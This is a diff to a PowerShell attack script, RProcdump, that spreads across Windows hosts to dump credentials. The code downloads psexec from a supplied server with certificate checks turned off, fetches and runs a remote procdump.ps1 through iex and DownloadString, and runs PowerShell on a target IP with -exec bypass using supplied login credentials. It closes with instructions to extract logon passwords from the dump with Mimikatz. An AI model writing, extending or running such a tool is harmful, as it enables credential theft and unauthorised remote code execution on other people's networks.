@@ -12,8 +12,8 @@ Help:
 
 Function RProcdump {
 	[CmdletBinding()] param( 
-	[string] $server 
-	[string] $login 
+	[string] $server ,
+	[string] $login ,
 	[string] $pass 
 	)
 #	[string] $server = "http://127.0.0.1"
@@ -30,11 +30,7 @@ Function RProcdump {
             if ($downloadURL.Substring(0,5) -ceq "https") {
                 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
             }
-			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
-            $WebResponse = $WebRequest.GetResponse()
-            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
-            $WebResponse.Close()
-            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
+			(New-Object System.Net.WebClient).DownloadFile($downloadURL, $FileOnDisk)
 			Rename-Item $FileOnDisk psexec.exe
 			}
 		}
@@ -54,15 +50,17 @@ iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
 			$y = $ip.split('.')[2]
 			$z = $ip.split('.')[3]
 			$StartAddress = "$w.$x.$y"
-			for($i = 1; $i -lt 254; $i++) {
-			$ipAddress= "$StartAddress.$i"
+			#for($i = 1; $i -lt 254; $i++) {
+			#$ipAddress= "$StartAddress.$i"
+			$ipAddress= "172.18.100.7"
 			$Command = "$env:userprofile\psexec.exe \\$ipAddress -u $login -p $pass -h -d powershell -exec bypass $cmdline"
 			[string] $CmdPath = "$env:windir\System32\cmd.exe"
 			[string] $CmdString = "$CmdPath" + " /C " + "$Command"
 			Invoke-Expression $CmdString
-			}	
+			#}	
 		}
 	}
-
-Write-Verbose "Open dump file with Mimikatz to retrieve the creds -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords"
+PsexecCommand
+echo "Open dump file with Mimikatz to retrieve the creds -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords"
 }
+
